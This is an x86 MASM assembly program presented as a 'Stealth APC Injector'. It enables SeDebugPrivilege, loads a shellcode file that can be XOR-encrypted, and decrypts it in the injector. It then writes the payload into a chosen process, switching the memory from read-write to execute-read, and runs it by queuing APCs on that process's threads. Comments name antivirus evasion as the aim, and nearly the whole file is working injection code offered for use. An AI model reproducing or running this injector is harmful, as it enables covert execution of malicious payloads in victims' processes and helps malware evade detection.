TITLE Stealth APC Injector v5.0 (No RWX - Injector Side Decryption)
INCLUDE Irvine32.inc
INCLUDELIB kernel32.lib
INCLUDELIB user32.lib
INCLUDELIB advapi32.lib

; =============================================================
; PROTOTYPES
; =============================================================
GetFileSize             PROTO STDCALL :DWORD, :PTR DWORD
CreateToolhelp32Snapshot PROTO STDCALL :DWORD, :DWORD
Process32First          PROTO STDCALL :DWORD, :PTR PROCESSENTRY32
Process32Next           PROTO STDCALL :DWORD, :PTR PROCESSENTRY32
Thread32First           PROTO STDCALL :DWORD, :PTR THREADENTRY32
Thread32Next            PROTO STDCALL :DWORD, :PTR THREADENTRY32
OpenProcess             PROTO STDCALL :DWORD, :DWORD, :DWORD
VirtualAllocEx          PROTO STDCALL :DWORD, :DWORD, :DWORD, :DWORD, :DWORD
VirtualProtectEx        PROTO STDCALL :DWORD, :DWORD, :DWORD, :DWORD, :PTR DWORD
WriteProcessMemory      PROTO STDCALL :DWORD, :DWORD, :PTR BYTE, :DWORD, :PTR DWORD
OpenThread              PROTO STDCALL :DWORD, :DWORD, :DWORD
QueueUserAPC            PROTO STDCALL :DWORD, :DWORD, :DWORD
GetCurrentProcess       PROTO STDCALL
OpenProcessToken        PROTO STDCALL :DWORD, :DWORD, :PTR DWORD
LookupPrivilegeValueA   PROTO STDCALL :PTR BYTE, :PTR BYTE, :PTR DWORD
AdjustTokenPrivileges   PROTO STDCALL :DWORD, :DWORD, :PTR BYTE, :DWORD, :PTR DWORD, :PTR DWORD

; =============================================================
; STRUCTURES & CONSTANTS
; =============================================================
PROCESSENTRY32 STRUCT
    dwSize              DWORD ?
    cntUsage            DWORD ?
    th32ProcessID       DWORD ?
    th32DefaultHeapID   DWORD ?
    th32ModuleID        DWORD ?
    cntThreads          DWORD ?
    th32ParentProcessID DWORD ?
    pcPriClassBase      DWORD ?
    dwFlags             DWORD ?
    szExeFile           BYTE 260 DUP(?)
PROCESSENTRY32 ENDS

THREADENTRY32 STRUCT
    dwSize              DWORD ?
    cntUsage            DWORD ?
    th32ThreadID        DWORD ?
    th32OwnerProcessID  DWORD ?
    tpBasePri           DWORD ?
    tpDeltaPri          DWORD ?
    dwFlags             DWORD ?
THREADENTRY32 ENDS

MAX_BUFFER_SIZE         EQU 500000
SE_PRIVILEGE_ENABLED    EQU 2
TOKEN_ADJUST_PRIVILEGES EQU 20h

.data
    titleMsg       BYTE "=== Stealth Injector v5.0 (No RWX - Safe Mode) ===",0Ah,0
    msgPrivSuccess BYTE "[+] Admin Privileges Enabled.",0Ah,0
    msgPrivFail    BYTE "[-] Failed to get Admin Rights!",0Ah,0
    
    modePrompt     BYTE 0Ah,"[?] Mode (1=Direct .bin, 2=Encrypted .bin): ",0
    promptPath     BYTE 0Ah,"[?] Enter File Path: ",0
    promptKey      BYTE "[?] Enter XOR Key (Hex): ",0
    promptSelect   BYTE 0Ah,"[?] Target PID: ",0
    
    msgDecrypting  BYTE "[*] Decrypting payload inside Injector memory...",0Ah,0
    msgInjecting   BYTE "[+] allocating RW memory...",0Ah,0
    msgProtect     BYTE "[+] Flipping memory to RX (Execute-Read)...",0Ah,0
    msgSuccess     BYTE "[SUCCESS] Code Injected safely.",0Ah,0
    msgError       BYTE "[ERROR] Operation Failed.",0Ah,0
    
    seDebugName    BYTE "SeDebugPrivilege",0
    filePath       BYTE 260 DUP(0)
    
    ; Buffer for Payload
    buffer         BYTE MAX_BUFFER_SIZE DUP(?) 
    
    bytesRW        DWORD 0
    targetPID      DWORD 0
    payloadSize    DWORD 0
    xorKey         DWORD 0 ; Stores the key user enters
    
    remoteAddr     DWORD 0
    oldProtect     DWORD 0
    hProc          DWORD 0
    hToken         DWORD 0
    injectionMode  DWORD 0
    
    procEntry      PROCESSENTRY32 <>
    threadEntry    THREADENTRY32 <>
    tkp            BYTE 16 DUP(0) 

.code
; -------------------------------------------------------
; Enable Admin Privileges
; -------------------------------------------------------
EnablePrivileges PROC
    invoke GetCurrentProcess
    invoke OpenProcessToken, eax, 28h, ADDR hToken 
    test eax, eax
    jz priv_fail
    invoke LookupPrivilegeValueA, NULL, ADDR seDebugName, ADDR tkp + 4
    test eax, eax
    jz priv_fail
    mov DWORD PTR tkp, 1
    mov DWORD PTR tkp + 12, SE_PRIVILEGE_ENABLED
    invoke AdjustTokenPrivileges, hToken, FALSE, ADDR tkp, 0, NULL, 0
    mov edx, OFFSET msgPrivSuccess
    call WriteString
    ret
priv_fail:
    mov edx, OFFSET msgPrivFail
    call WriteString
    ret
EnablePrivileges ENDP

; -------------------------------------------------------
; Load File
; -------------------------------------------------------
LoadFileProc PROC uses ebx, fileName:DWORD, dest:DWORD
    invoke CreateFile, fileName, 80000000h, 1, 0, 3, 80h, 0
    cmp eax, -1
    je L_Fail
    mov ebx, eax
    invoke GetFileSize, ebx, 0
    cmp eax, MAX_BUFFER_SIZE
    ja L_FailClose
    push eax
    invoke ReadFile, ebx, dest, eax, OFFSET bytesRW, 0
    invoke CloseHandle, ebx
    pop eax
    ret
L_FailClose:
    invoke CloseHandle, ebx
L_Fail:
    xor eax, eax
    ret
LoadFileProc ENDP

; -------------------------------------------------------
; MAIN
; -------------------------------------------------------
main PROC
    call Clrscr
    mov edx, OFFSET titleMsg
    call WriteString
    call EnablePrivileges

    ; 1. Select Mode
    mov edx, OFFSET modePrompt
    call WriteString
    call ReadInt
    mov injectionMode, eax

    ; 2. Get File Path
    mov edx, OFFSET promptPath
    call WriteString
    mov edx, OFFSET filePath
    mov ecx, 259
    call ReadString

    ; 3. Load File to Buffer
    invoke LoadFileProc, OFFSET filePath, OFFSET buffer
    mov payloadSize, eax
    cmp eax, 0
    je fatal_error

    ; 4. IF MODE 2: Ask for Key and Decrypt HERE
    cmp injectionMode, 2
    jne get_pid

    mov edx, OFFSET promptKey
    call WriteString
    call ReadHex        ; User enters Key (e.g., 55 or AA)
    mov xorKey, eax     ; Save key in xorKey variable

    mov edx, OFFSET msgDecrypting
    call WriteString

    ; --- DECRYPTION LOOP ---
    mov esi, OFFSET buffer      ; Point to data
    mov ecx, payloadSize        ; Loop counter
    mov ebx, xorKey             ; Move Key to EBX
    
Decrypt_Loop:
    xor byte ptr [esi], bl      ; XOR Memory with Key
    inc esi                     ; Next Byte
    loop Decrypt_Loop           ; Continue
    ; -----------------------

get_pid:
    mov edx, OFFSET promptSelect
    call WriteString
    call ReadInt
    mov targetPID, eax

    ; 5. Open Process
    invoke OpenProcess, 1F0FFFh, 0, targetPID
    test eax, eax
    jz fatal_error
    mov hProc, eax

    ; 6. Alloc RW Memory (Not RWX)
    mov edx, OFFSET msgInjecting
    call WriteString
    ; 0x04 = PAGE_READWRITE (Safe for AV)
    invoke VirtualAllocEx, hProc, 0, payloadSize, 3000h, 04h
    mov remoteAddr, eax

    ; 7. Write Payload (It is now Clean code because we decrypted it above)
    invoke WriteProcessMemory, hProc, remoteAddr, OFFSET buffer, payloadSize, OFFSET bytesRW

    ; 8. Protect RX (Execute Read) - The Stealth Step
    mov edx, OFFSET msgProtect
    call WriteString
    ; 0x20 = PAGE_EXECUTE_READ (Standard Code Permission)
    invoke VirtualProtectEx, hProc, remoteAddr, payloadSize, 20h, OFFSET oldProtect

    ; 9. Queue APC (Run it)
    invoke CreateToolhelp32Snapshot, 4, 0
    mov esi, eax
    mov threadEntry.dwSize, SIZEOF THREADENTRY32
    invoke Thread32First, esi, OFFSET threadEntry

T_Loop:
    mov eax, threadEntry.th32OwnerProcessID
    cmp eax, targetPID
    jne next_thread
    
    invoke OpenThread, 001F03FFh, 0, threadEntry.th32ThreadID
    test eax, eax
    jz next_thread
    push eax
    
    invoke QueueUserAPC, remoteAddr, eax, 0
    
    pop eax
    invoke CloseHandle, eax
    
next_thread:
    invoke Thread32Next, esi, OFFSET threadEntry
    test eax, eax
    jz close_handles
    jmp T_Loop

close_handles:
    invoke CloseHandle, esi
    invoke CloseHandle, hProc
    
    mov edx, OFFSET msgSuccess
    call WriteString
    call WaitMsg
    invoke ExitProcess, 0

fatal_error:
    mov edx, OFFSET msgError
    call WriteString
    call WaitMsg
    invoke ExitProcess, 1

main ENDP
END main